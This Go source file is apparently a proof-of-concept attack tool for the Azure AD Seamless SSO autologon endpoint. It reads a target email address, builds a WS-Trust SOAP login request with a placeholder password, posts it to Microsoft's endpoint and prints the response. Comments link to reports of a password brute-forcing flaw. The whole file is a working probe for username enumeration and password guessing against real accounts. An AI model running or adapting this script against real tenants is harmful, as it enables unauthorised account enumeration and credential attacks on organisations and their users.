package main

import (
	"bufio"
	"encoding/xml"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"time"

	uuid "github.com/satori/go.uuid"
)

/*
Inspiration posts:
- https://arstechnica.com/information-technology/2021/09/new-azure-active-directory-password-brute-forcing-flaw-has-no-fix/
- https://securecloud.blog/2019/12/26/reddit-thread-answer-azure-ad-autologon-endpoint/
- Error codes (https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes#aadsts-error-codes)
*/

type Target struct {
	user   string
	domain string
	guid   string
}

type Envelope struct {
	XMLName xml.Name  `xml:"Envelope"`
	Headers []Headers `xml:"Header"`
	Body    []Body    `xml:"Body"`
}

type Headers struct {
	XMLName xml.Name `xml:"Header"`
	Action  string   `xml:"Action"`
	MsgID   string   `xml:"MessageID"`
}

type Body struct {
}

func guidGeneration() string {
	// GUID Generation

	identifier, err := uuid.NewV4()
	if err != nil {
		fmt.Printf("Something went wrong: %s", err)
	}
	fmt.Printf("GUID: %s\n", identifier)
	return identifier.String()
}

func query(t *Target) {
	tar := "https://autologon.microsoftazuread-sso.com/" + t.domain + "/winauth/trust/2005/usernamemixed?client-request-id=" + t.guid

	var body = strings.NewReader(`<?xml version="1.0" encoding="UTF-8"?>
	<s:Envelope xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://www.w3.org/2005/08/addressing" xmlns:u="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
	  <s:Header>
		<a:Action s:mustUnderstand="1">http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</a:Action>
		<a:MessageID>urn:uuid:` + guidGeneration() + `</a:MessageID>
		<a:ReplyTo>
		  <a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address>
		</a:ReplyTo>
		<a:To s:mustUnderstand="1">` + tar + `</a:To>
		<o:Security xmlns:o="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd" s:mustUnderstand="1">
		  <u:Timestamp u:Id="_0">
			<u:Created>` + time.Now().Format(time.RFC3339Nano) + `</u:Created>
			<u:Expires>` + time.Now().Add(time.Minute*10).Format(time.RFC3339Nano) + `</u:Expires>
		  </u:Timestamp>
		  <o:UsernameToken u:Id="uuid-ec4527b8-bbb0-4cbb-88cf-abe27fe60977">
			<o:Username>` + t.user + ` </o:Username>
			<o:Password>Pword</o:Password>
		  </o:UsernameToken>
		</o:Security>
	  </s:Header>
	  <s:Body>
		<trust:RequestSecurityToken xmlns:trust="http://schemas.xmlsoap.org/ws/2005/02/trust">
		  <wsp:AppliesTo xmlns:wsp="http://schemas.xmlsoap.org/ws/2004/09/policy">
			<a:EndpointReference>
			  <a:Address>urn:federation:MicrosoftOnline</a:Address>
			</a:EndpointReference>
		  </wsp:AppliesTo>
		  <trust:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</trust:KeyType>
		  <trust:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</trust:RequestType>
		</trust:RequestSecurityToken>
	  </s:Body>
	</s:Envelope>
	`)

	req, err := http.NewRequest("POST", tar, body)

	if err != nil {
		fmt.Printf("Something went wrong! %s", err)
	}

	res, err := http.DefaultClient.Do(req)

	if err != nil {
		fmt.Printf("Something went wrong! %s", err)
	}

	data, _ := ioutil.ReadAll(res.Body)
	fmt.Print(string(data))
	res.Body.Close()
	/*
		// XML Template to ensure consistency (Consider implementing this in code to avoid additional files.)
		xmlFile, err := os.Open("request.xml")

		if err != nil {
			fmt.Printf("Something went wrong: %s", err)
		}

		fmt.Println("Successfully opened request.xml")


		contents := bufio.NewScanner(xmlFile)

		for contents.Scan() {
			fmt.Println(contents.Text())
		}

		defer xmlFile.Close()
	*/
}

func main() {

	reader := bufio.NewReader(os.Stdin)
	fmt.Println("Enter Target User: ")
	tarUser, _ := reader.ReadString('\n')
	// convert CRLF to LF
	tarUser = strings.Replace(tarUser, "\n", "", -1)
	tarDomain := strings.Split(tarUser, "@")

	target := Target{
		user:   tarUser,
		domain: tarDomain[1],
		guid:   guidGeneration(),
	}

	query(&target)
}
